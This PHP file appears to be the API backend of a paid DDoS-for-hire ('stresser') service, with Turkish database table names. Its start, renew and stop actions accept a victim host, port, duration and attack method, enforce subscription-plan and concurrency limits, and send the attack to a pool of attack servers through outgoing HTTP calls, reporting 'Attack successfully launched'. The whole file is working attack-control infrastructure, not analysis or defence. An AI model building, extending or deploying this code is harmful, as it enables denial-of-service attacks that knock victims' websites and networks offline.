<?php
session_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
try {
    $db = new PDO("mysql:host=localhost;dbname=web", "root", "");
} catch (PDOException $e) {
    die(json_encode(["error" => true, "message" => "Internal server error"]));
}
function getUserIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
function dox($data) {
    echo json_encode($data);
}
function valid_URL($url){
    return preg_match('%^(?:(?:https?|ftp)://)(?:\S+(?::\S*)?@|\d{1,3}(?:\.\d{1,3}){3}|(?:(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)(?:\.(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)*(?:\.[a-z\x{00a1}-\x{ffff}]{2,6}))(?::\d+)?(?:[^\s]*)?$%iu', $url);
}
function isBlacklisted($host) {
    global $db;
    $checkBlacklistData = $db->prepare("SELECT * FROM blacklist WHERE deger LIKE ?");
    $checkBlacklistData->execute(["%".$host."%"]);
    return ($checkBlacklistData->rowCount() >= 1 ? true : false);
}
function isSlotExceeded() {
    global $db;
    $date = date("Y-m-d H:i:s"); 
    $checkLogs = $db->prepare("SELECT * FROM log WHERE sonlanma > ?");
    $checkLogs->execute([$date]);
    $checkLogsTotal = $checkLogs->rowCount();
    $checkServerTotalSlots = $db->prepare("SELECT SUM(es_zaman) as toplam FROM sunucular");
    $checkServerTotalSlots->execute();
    $checkServerLogsResult = $checkServerTotalSlots->fetch(PDO::FETCH_ASSOC);
    return ($checkLogsTotal >= $checkServerLogsResult ? true : false);
}
function isConcurrentExceeded($userId, $planConcurrent) {
    global $db;
    $date = date("Y-m-d H:i:s");
    $checkConcurrentAttacks = $db->prepare("SELECT * FROM log WHERE user = ? AND sonlanma > ?");
    $checkConcurrentAttacks->execute([$userId, $date]);
    $getConcurrentAttacks = $checkConcurrentAttacks->rowCount();
    return ($getConcurrentAttacks >= $planConcurrent ? true : false);
}
if($_SERVER["REQUEST_METHOD"] == "GET") {
    if(isset($_GET["key"])) {
        $key = $_GET["key"];
        $requestIP = getUserIP();
        $fetchUserData = $db->prepare("SELECT * FROM user WHERE apiKey = ? AND apiWhitelistIP = ?");
        $fetchUserData->execute([$key, $requestIP]);

        if($fetchUserData->rowCount() == 1) {
            $userData = $fetchUserData->fetch(PDO::FETCH_ASSOC);
            $fetchPlanData = $db->prepare("SELECT * FROM paketler WHERE id = ?");
            $fetchPlanData->execute([$userData["uyelik"]]);
            $planData = $fetchPlanData->fetch(PDO::FETCH_ASSOC);
            if($planData["apiAccess"] == 1) {
                if(isset($_GET["action"])) {
                    switch($_GET["action"]) {
                        case "start":
                            if(isset($_GET["host"]) && isset($_GET["port"]) && isset($_GET["time"]) && isset($_GET["method"])) {
                                $host = $_GET["host"];
                                $port = $_GET["port"];
                                $time = $_GET["time"];
                                $method = $_GET["method"];
                                if(is_numeric($port) && $port >= 1 && $port <= 65535) {
                                    if(is_numeric($time) && $time >= 5 && $time <= 10000) {
                                        $fetchMethodData = $db->prepare("SELECT * FROM method WHERE deger = ?");
                                        $fetchMethodData->execute([$_GET["method"]]);
                                        if($fetchUserData->rowCount() == 1) {
                                            if($fetchMethodData->rowCount() == 1) {
                                                $methodData = $fetchMethodData->fetch(PDO::FETCH_ASSOC);
                                                if($planData["node"] != "VIP" && $methodData["node"] == "VIP") {
                                                    return dox(["error" => true, "message" => "You should upgrade your plan to use VIP methods"]);
                                                } else {
                                                    if($methodData["kate"] == "Layer7") {
                                                        if(!valid_URL($host)) return dox(["error" => true, "message" => "Invalid URL provided"]);
                                                    } else {
                                                        if(!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) return dox(["error" => true, "message" => "Invalid host provided"]);
                                                    }
                                                    if(isBlacklisted($host)) return dox(["error" => true, "message" => "This Host/URL is blacklisted"]);
                                                    if(isSlotExceeded()) return dox(["error" => true, "message" => "All slots just taken, please try again later"]);
                                                    if(isConcurrentExceeded($userData["id"], $planData["es_zaman"])) return dox(["error" => true, "message" => "Concurrent attack limit just exceeded"]);

                                                    $fetchServers = $db->prepare("SELECT * FROM sunucular WHERE paket = 0 ORDER BY rand()");
                                                    $fetchServers->execute();
                                                    $fetchServersGet = $fetchServers->fetchAll(PDO::FETCH_ASSOC);

                                                    $tempAttack = [];

                                                    $go = 0;
                                                    $serverId = null;
                                                    foreach($fetchServersGet as $server) {
                                                        $fetchServerLog = $db->prepare("SELECT * FROM log WHERE sunucu = ? AND sonlanma > ?");
                                                        $fetchServerLog->execute([$server["id"], date("Y-m-d H:i:s")]);
                                                        $serverId = $server["id"];

                                                        if($fetchUserData->rowCount() < $server["es_zaman"]) {
                                                            $go++;
                                                            array_push($tempAttack, ["api" => $server["api"], "host" => $host, "port" => $port, "time" => $time, "method" => $method, "node" => $planData["node"]]);

                                                            if($go >= $planData["anlik_saldir"]) {
                                                                break;
                                                            }
                                                        }
                                                    }
                                                    if($go >= 1) {
                                                        $addLog = $db->prepare("INSERT INTO log SET user = ?, ip = ?, port = ?, sure = ?, method = ?, tarih = ?, sonlanma = ?, sunucu = ?, saldiri = ?, api = 1");
                                                        $addLog->execute([$userData["id"], $host, $port, $time, $method, date("Y-m-d H:i:s"), date("Y-m-d H:i:s", strtotime("+".$time." second")), $serverId, $planData["anlik_saldir"]]);
                                                        if($addLog) {
                                                            $lastInsertId = $db->lastInsertId();
                                                            foreach($tempAttack as $k => $v) {
                                                                @file_get_contents($v["api"]."&host=".$v["host"]."&port=".$v["port"]."&time=".$v["time"]."&method=".$v["method"]."&node=".$v["node"]."&id=".$lastInsertId);
                                                            }
                                                            dox(["success" => true, "message" => "Attack successfully launched", "data" => ["id" => (int) $lastInsertId, "host" => $host, "port" => (int) $port, "time" => (int) $time, "method" => $method]]);
                                                        } else {
                                                            dox(["error" => true, "message" => "An error occurred while launch attack, please try again later"]);
                                                        }
                                                    } else {
                                                        dox(["error" => true, "message" => "An error occurred while launch attack, please try again later"]);
                                                    }
                                                }
                                            } else {
                                                dox(["error" => true, "message" => "Invalid method"]);
                                            }
                                        } else {
                                            dox(["error" => true, "message" => "Invalid method"]);
                                        }
                                    } else {
                                        return dox(["error" => true, "message" => "Invalid time provided"]);
                                    }
                                } else {
                                    return dox(["error" => true, "message" => "Invalid port provided"]);
                                }
                            } else {
                                dox(["error" => true, "message" => "Please fill all fields"]);
                            }
                            break;
                        case "renew":
                            if(isset($_GET["id"])) {
                                $id = $_GET["id"];
                                if(is_numeric($id)) {
                                    $fetchAttack = $db->prepare("SELECT * FROM log WHERE id = ? AND user = ? AND api = 1");
                                    $fetchAttack->execute([$id, $userData["id"]]);
                                    if($fetchAttack->rowCount() >= 1) {
                                        if(isSlotExceeded()) return dox(["error" => true, "message" => "All slots just taken, please try again later"]);
                                        if(isConcurrentExceeded($userData["id"], $planData["es_zaman"])) return dox(["error" => true, "message" => "Concurrent attack limit just exceeded"]);
                                        $fetchAttackData = $fetchAttack->fetch(PDO::FETCH_ASSOC);
                                        $fetchServers = $db->prepare("SELECT * FROM sunucular WHERE paket = 0 ORDER BY rand()");
                                        $fetchServers->execute();
                                        $fetchServersGet = $fetchServers->fetchAll(PDO::FETCH_ASSOC);
                                        $tempAttack = [];
                                        $go = 0;
                                        $serverId = null;
                                        foreach($fetchServersGet as $server) {
                                            $fetchServerLog = $db->prepare("SELECT * FROM log WHERE sunucu = ? AND sonlanma > ?");
                                            $fetchServerLog->execute([$server["id"], date("Y-m-d H:i:s")]);
                                            $serverId = $server["id"];

                                            if($fetchUserData->rowCount() < $server["es_zaman"]) {
                                                $go++;
                                                array_push($tempAttack, ["api" => $server["api"], "host" => $fetchAttackData["ip"], "port" => $fetchAttackData["port"], "time" => $fetchAttackData["sure"], "method" => $fetchAttackData["method"], "node" => $planData["node"]]);

                                                if($go >= $planData["anlik_saldir"]) {
                                                    break;
                                                }
                                            }
                                        }
                                        if($go >= 1) {
                                            $addLog = $db->prepare("INSERT INTO log SET user = ?, ip = ?, port = ?, sure = ?, method = ?, tarih = ?, sonlanma = ?, sunucu = ?, saldiri = ?, api = 1");
                                            $addLog->execute([$userData["id"], $fetchAttackData["ip"], $fetchAttackData["port"], $fetchAttackData["sure"], $fetchAttackData["method"], date("Y-m-d H:i:s"), date("Y-m-d H:i:s", strtotime("+".$fetchAttackData["sure"]." second")), $serverId, $planData["anlik_saldir"]]);
                                            if($addLog) {
                                                $lastInsertId = $db->lastInsertId();
                                                foreach($tempAttack as $k => $v) {
                                                    @file_get_contents($v["api"]."&host=".$v["host"]."&port=".$v["port"]."&time=".$v["time"]."&method=".$v["method"]."&node=".$v["node"]."&id=".$lastInsertId);
                                                }
                                                dox(["success" => true, "message" => "Attack successfully launched", "data" => ["id" => (int) $lastInsertId, "host" => $fetchAttackData["ip"], "port" => (int) $fetchAttackData["port"], "time" => (int) $fetchAttackData["sure"], "method" => $fetchAttackData["method"]]]);
                                            } else {
                                                dox(["error" => true, "message" => "An error occurred while launch attack, please try again later"]);
                                            }
                                        } else {
                                            dox(["error" => true, "message" => "An error occurred while launch attack, please try again later"]);
                                        }
                                    }
                                } else {
                                    dox(["error" => true, "message" => "Invalid attack ID provided"]);
                                }
                            } else {
                                dox(["error" => true, "message" => "Please specify an attack ID"]);
                            }
                            break;
                        case "stop":
                            if(isset($_GET["id"])) {
                                $id = $_GET["id"];
                                if(is_numeric($id)) {
                                    $fetchAttack = $db->prepare("SELECT * FROM log WHERE id = ? AND user = ? AND api = 1");
                                    $fetchAttack->execute([$id, $userData["id"]]);
                                    if($fetchAttack->rowCount() >= 1) {
                                        $fetchAttackData = $fetchAttack->fetch(PDO::FETCH_ASSOC);
                                        $fetchServers = $db->prepare("SELECT * FROM sunucular WHERE id = ?");
                                        $fetchServers->execute([$fetchAttackData["sunucu"]]);
                                        $fetchServerGet = $fetchServers->fetch(PDO::FETCH_ASSOC);

                                        $hehes = @file_get_contents($fetchServerGet["api"]."&host=".$fetchAttackData["ip"]."&port=".$fetchAttackData["port"]."&time=".$fetchAttackData["sure"]."&method=STOP&node=VIP&id=".$id);
                                        $updateAttackData = $db->prepare("UPDATE log SET sonlanma = ? WHERE id = ?");
                                        $updateAttackData->execute([date("Y-m-d H:i:s"), $id]);

                                        if($updateAttackData) {
                                            dox(["success" => true, "message" => "Attack successfully stopped"]);
                                        } else {
                                            dox(["error" => true, "message" => "An error occurred while stop attack, please try again later"]);
                                        }
                                    } else {
                                        dox(["error" => true, "message" => "Invalid attack ID provided"]);
                                    }
                                } else {
                                    dox(["error" => true, "message" => "Invalid attack ID provided"]);
                                }
                            } else {
                                dox(["error" => true, "message" => "Please specify an attack ID"]);
                            }
                            break;
                        default:
                        dox(["error" => true, "message" => "Invalid action provided. [start, renew, stop]"]);
                    }
                } else {
                    dox(["error" => true, "message" => "Please specify an action"]);
                }
            } else {
                dox(["error" => true, "message" => "You are not authorized to use API"]);
            }
        } else {
            dox(["error" => true, "message" => "Invalid key provided or you're not authorized to use API."]);
        }
    } else {
        dox(["error" => true, "message" => "Bad key"]);
    }
} else {
    dox(["error" => true, "message" => "Bad request method"]);
}
?>